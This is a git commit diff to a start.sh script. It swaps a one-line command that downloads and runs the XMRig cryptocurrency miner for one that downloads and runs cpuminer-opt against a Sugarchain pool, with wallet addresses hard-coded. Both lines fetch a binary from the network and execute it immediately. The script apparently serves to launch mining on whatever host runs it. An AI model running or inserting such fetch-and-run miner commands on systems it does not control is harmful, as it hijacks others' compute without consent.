a8183f9147241ced9dd9196edfec5ffae5adcc70
wgblkj <106138598+wgblkj@users.noreply.github.com>
2022-05-24 08:05:30 +0000

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,2 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-static-x64.tar.gz && tar xvf xmrig-6.17.0-linux-static-x64.tar.gz && ./xmrig-6.17.0/xmrig -o statum+ssl://rx.unmineable.com:443 -a rx -k -u DOGE:D8YGsVokte9ahg7P1pCn5BLWfUouDWF6qQ -p x
-
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar xvf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:7042 -u sugar1qynyfrlajrx2rz9f89f67dj7h9kzgss8002wq9s
